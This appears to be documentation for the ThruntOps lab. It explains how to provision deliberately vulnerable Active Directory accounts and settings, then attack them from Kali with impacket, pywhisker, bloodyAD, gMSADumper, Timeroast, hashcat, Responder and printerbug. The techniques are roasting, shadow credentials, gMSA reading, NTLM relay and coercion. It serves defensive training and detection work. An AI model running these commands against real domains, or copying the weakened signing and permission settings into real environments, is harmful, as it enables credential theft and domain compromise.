AD Vulnerability Scenarios

AD Vulnerability Scenarios

This page describes the credential-access states provisioned by the local ThruntOps AD roles and how to exercise them from the lab’s Kali VM. These are manual, post-deployment profiles; they are not enabled by default and are not part of the range deployment. Run them only in an isolated ThruntOps range.

The project uses hands-on Kali commands and published tool/technique references for these exercises. It does not use Atomic Red Team.

Provisioning scenarios

Use the dedicated Vulnerability Provision page for requirements, CLI help, scenario listing, configuration status, and the apply workflow. Use Vulnerabilities Check for live checks, scenario validation, and the Kali runner. This page focuses on exploiting the provisioned states from Kali.

Lab values

Replace <range> with the range’s subnet number. Kali is 10.<range>.20.250, the domain controller is 10.<range>.20.11, and the workstation is 10.<range>.20.21.

1
2
3

export DC_IP=10.<range>.20.11
export WS_IP=10.<range>.20.21
export KALI_IP=10.<range>.20.250

Kali is configured to resolve the domain through the DC. The examples use the default scenario credentials in the roles; use the values configured for the profile if they have been changed. The Kali role configures DNS and Kerberos; it does not install every tool shown below. Check the linked project pages for installation instructions if a command is unavailable.

AS-REP roasting

What it is: An AD account has Kerberos preauthentication disabled. An unauthenticated requester can ask the KDC for authentication data and receive a password-derived response that can be cracked offline. This profile creates user.asrep with preauthentication disabled.

From Kali:

1

impacket-GetNPUsers -dc-ip "$DC_IP" thruntops.domain/user.asrep -no-pass

A successful result includes an AS-REP hash (commonly $krb5asrep$). Save it and test it offline with a password-recovery tool. The default profile password is password1.

References: Impacket GetNPUsers · The Hacker Recipes: AS-REP roasting

Timeroasting

What it is: Microsoft’s SNTP extension allows an unauthenticated request to the domain controller to obtain a response authenticated with a computer account’s password hash. This profile creates the enabled computer account computer.timeroasting$ with the deliberately weak default password password1. The role sets that password only when the account has no initialized password, so applying the profile again does not rotate it.

Apply with python3 scripts/thruntops-scenarios.py --range <range_id> apply timeroasting. From Kali, run the standalone Timeroast client against $DC_IP, then test its output offline with Hashcat (mode 31300 is MS-SNTP). Timeroast output identifies accounts by RID; map the target RID to the computer account in AD when validating the result.

1
2

python3 timeroast.py "$DC_IP" > timeroast-hashes.txt
hashcat -m 31300 --username timeroast-hashes.txt /usr/share/wordlists/rockyou.txt

References: The Hacker Recipes: Timeroasting · Timeroast tool

Shadow Credentials

What it is: An account that can write another principal’s msDS-KeyCredentialLink attribute can add a key credential and authenticate using the corresponding certificate (Key Trust). This profile creates the target user.shadowcred and low-privilege actor svc.shadowcred, then grants the actor an explicit WriteProperty ACE scoped only to msDS-KeyCredentialLink on the target. It does not rely on the patched implicit-owner behavior for self-created computer accounts.

Apply with: python3 scripts/thruntops-scenarios.py --range <range_id> apply shadow-credentials. From Kali, use PyWhisker to add a key credential as the delegated actor:

1
2

pywhisker -d thruntops.domain -u svc.shadowcred -p 'password1' \
  --target user.shadowcred --action add --dc-ip "$DC_IP"

PyWhisker writes the certificate/PFX material locally and reports its path and password. Treat those outputs as secrets. The target account password defaults to password1; the actor password also defaults to password1. Remove the created key credential after testing (record its Device ID and use PyWhisker’s remove action), or restore the lab snapshot.

References: PyWhisker · The Hacker Recipes: Shadow Credentials

DPAPI secrets

What it is: Windows DPAPI can protect user data using keys associated with the user’s profile. This profile creates user.dpapi in AD and runs as that user on the Windows 11 workstation to store a CurrentUser-protected secret at %LOCALAPPDATA%\ThruntOps\dpapi-secret.txt. The default secret and account password are both password1.

Apply with python3 scripts/thruntops-scenarios.py --range <range_id> apply dpapi. The file contains a DPAPI-protected ConvertFrom-SecureString value, not the plaintext. From a PowerShell session running as THRUNTOPS\user.dpapi, the profile-protected value can be decrypted with:

1
2
3

$blob = Get-Content "$env:LOCALAPPDATA\ThruntOps\dpapi-secret.txt" -Raw
$secure = ConvertTo-SecureString $blob
[System.Net.NetworkCredential]::new('', $secure).Password

The profile creates the secret idempotently and uses the target user’s loaded Windows profile so the DPAPI protection is bound to that user. Restore the workstation snapshot or remove the test user and profile artifacts during cleanup.

References: Microsoft DPAPI overview · ConvertFrom-SecureString

Group Managed Service Account (gMSA)

What it is: A gMSA password is managed by Active Directory and normally readable only by explicitly authorized principals. This profile creates svc.gmsa and deliberately authorizes the baseline low-privilege domainuser to retrieve its managed password. It is a password-retrieval misconfiguration, not a CVE, and it does not assign a crackable static password to the gMSA.

Apply with python3 scripts/thruntops-scenarios.py --range <range_id> apply gmsa. The profile creates a KDS root key only if the domain lacks one; in this single-DC lab it backdates the key by 10 hours to avoid the normal forest replication wait. Do not use that shortcut in a multi-DC or production forest.

From Kali, authenticate to LDAP as the configured low-privilege domain user with gMSADumper to read the authorized gMSA password blob:

1
2

python3 gMSADumper.py -u domainuser -p 'password' \
  -d thruntops.domain -l "$DC_IP"

Use the baseline credentials configured for the range if they differ from the example. Cleanup may remove svc.gmsa; retain the KDS root key because it is a domain-wide prerequisite that may be shared by other gMSAs.

References: Microsoft gMSA management · Ansible microsoft.ad.service_account · gMSADumper

Kerberoasting

What it is: A domain user with a Service Principal Name (SPN) can have a Kerberos service ticket requested by an authenticated domain user. The ticket contains material that can be cracked offline. This profile creates svc.backup, registers an SPN, restricts it to RC4, and grants the account local administrator rights on the workstation to demonstrate the impact of recovering its password.

From Kali:

1
2

impacket-GetUserSPNs -dc-ip "$DC_IP" -request \
  'thruntops.domain/svc.backup:password1'

The output includes a $krb5tgs$ hash. The default profile password is password1.

References: Impacket GetUserSPNs · The Hacker Recipes: Kerberoasting

Targeted Kerberoasting

What it is: A delegated account is allowed to write the servicePrincipalName attribute of a privileged account. The tester uses that permission to assign an SPN, requests a service ticket, and attempts to crack it offline. This profile creates admin.tier0 in Domain Admins with no SPN, then grants svc.helpdesk the narrowly scoped WriteProperty permission on that attribute.

From Kali: assign a temporary SPN using the delegated account, request its ticket, then remove the SPN after testing:

1

bloodyAD --host "$DC_IP" -d thruntops.domain \
  -u svc.helpdesk -p 'welcome1' \
  msldap addspn 'CN=admin.tier0,CN=Users,DC=thruntops,DC=domain' \
  'http/roast.thruntops.domain'

impacket-GetUserSPNs -dc-ip "$DC_IP" -request \
  'thruntops.domain/svc.helpdesk:welcome1'

bloodyAD --host "$DC_IP" -d thruntops.domain \
  -u svc.helpdesk -p 'welcome1' \
  msldap delspn 'CN=admin.tier0,CN=Users,DC=thruntops,DC=domain' \
  'http/roast.thruntops.domain'

Confirm that the ticket output contains a $krb5tgs$ hash. The default victim password is trustno1; the delegated account password is welcome1.

References: BloodyAD User Guide · Impacket GetUserSPNs · The Hacker Recipes: targeted Kerberoasting

NTLM relay

What it is: NTLM relay forwards a live NTLM authentication exchange to a different service instead of cracking the response. Relay is possible when the target service does not enforce protections such as SMB signing or LDAP signing and channel binding. The profile creates user.ntlmrelay, relaxes LDAP signing and channel-binding settings on the DC, and stops requiring SMB signing on the workstation.

From Kali: start a relay listener for one target:

1
2
3

impacket-ntlmrelayx -t "smb://$WS_IP" -smb2support
# Or, in a separate test, target LDAP on the DC:
impacket-ntlmrelayx -t "ldap://$DC_IP"

The listener needs a separate, authorized source of incoming NTLM authentication. This four-node lab does not provision an NTLM coercion source or trigger, so the commands above alone do not produce a relay. The impact of a successful relay depends on the rights of the relayed identity; the profile weakens the protocol protections but does not grant the relayed identity additional directory permissions. Restart services or the affected Windows hosts if the registry policy changes have not taken effect.

References: Impacket ntlmrelayx · The Hacker Recipes: NTLM relay

Authentication coercion (MS-RPRN)

What it is: The Print Spooler exposes remote printer RPC methods that can induce a computer to authenticate to a tester-controlled host. This lab scenario is an intentional service-configuration weakness: it enables Print Spooler on the DC and creates the low-privilege user.coercion account needed to invoke the RPC method. It does not depend on exploiting a CVE.

From Kali: start a capture or relay listener first, then trigger the DC to authenticate to Kali. With Responder listening on Kali’s lab interface:

1

sudo responder -I eth0

In a second Kali terminal, run printerbug.py from dirkjanm/krbrelayx:

1
2
3

python3 printerbug.py \
  "THRUNTOPS/user.coercion:password1@${DC_IP}" \
  "$KALI_IP"

The DC should attempt NTLM authentication to Kali; Responder should show the computer account (THRUNTOPS$) rather than user.coercion, because the Spooler service performs the outbound authentication. The machine-account secret is randomly managed by AD, so this exercise demonstrates coercion and telemetry, not a crackable password. For a relay exercise, replace Responder with an appropriate ntlmrelayx listener and use only targets inside this lab.

References: krbrelayx printerbug.py · The Hacker Recipes: MS-RPRN coercion and NTLM relay

Detection and cleanup

The upstream AD CS scenarios have a dedicated ADCS Exploitation Scenarios guide, covering the ESC entries available through the provisioner.

Run one scenario at a time and search the selected SIEM for activity on the DC and workstation at the time of the test. Kerberos requests and NTLM authentication should be visible only if the relevant Windows event channels are being collected. Check the backend guide for its query and data-source details: Elastic, Wazuh, or Splunk.

Remove the temporary SPN after the targeted Kerberoasting exercise. To return the lab to its baseline, remove the scenario identities and restore the LDAP and SMB signing policy values changed by the NTLM relay profile.
